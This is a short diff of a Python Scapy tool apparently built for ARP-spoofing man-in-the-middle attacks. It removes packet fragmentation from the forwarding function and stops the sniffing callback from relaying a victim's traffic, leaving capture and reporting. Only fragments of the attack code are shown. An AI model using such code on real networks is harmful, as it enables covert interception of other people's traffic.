@@ -23,12 +23,7 @@ def arpSpoof(targetIp, spoofIp, iface):
 
 def forwardPacket(pkt, victimIp, targetIp, iface):
      if pkt.haslayer(IP):
-        if len(pkt) <= 1500:
-            sendp(pkt, iface=iface, verbose=False)
-        else:
-            fragments = fragment(pkt)
-            for frag in fragments:
-                sendp(frag, iface=iface, verbose=False) 
+        sendp(pkt, iface=iface, verbose=False)
 
 def sniffAndForward(victimIp, targetIp, iface):
     print(f"Starting packet sniffing on {iface}")
@@ -102,7 +97,7 @@ def createReport(victimIp, targetIp, iface):
     try:
         print(f"\nSniffing packets involving {victimIp}... Press Ctrl+C to stop and create a report.")
         time.sleep(1)
-        sniff(iface=iface, filter="ip", prn=lambda pkt: (packetCallback(pkt), forwardPacket(pkt, victimIp, targetIp, iface)), store=False, timeout=None)
+        sniff(iface=iface, filter="ip", prn=lambda pkt: packetCallback(pkt), store=False, timeout=None)
     except KeyboardInterrupt:
         print("\nStopping packet sniffing.")
 
